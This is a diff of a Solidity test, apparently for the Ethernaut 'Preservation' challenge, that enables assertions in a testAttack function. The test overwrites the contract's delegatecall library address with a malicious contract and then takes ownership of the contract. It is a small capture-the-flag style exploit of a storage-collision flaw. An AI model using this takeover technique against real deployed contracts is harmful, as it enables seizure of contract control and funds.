@@ -21,9 +21,9 @@ contract PreservationTest is Test {
 
     function testAttack() public {
         preservation.setFirstTime(uint256(uint160(address(attackLib))));
-        // assertEq(preservation.timeZone2Library(), address(lib2));
-        // assertEq(preservation.timeZone1Library(), address(attackLib), "Should set lib to malicous contract");
-        // preservation.setFirstTime(uint256(uint160(address(this))));
-        // assertEq(preservation.owner(), address(this), "Should set owner to attacker");
+        assertEq(preservation.timeZone2Library(), address(lib2));
+        assertEq(preservation.timeZone1Library(), address(attackLib), "Should set lib to malicous contract");
+        preservation.setFirstTime(uint256(uint160(address(this))));
+        assertEq(preservation.owner(), address(this), "Should set owner to attacker");
     }
 }
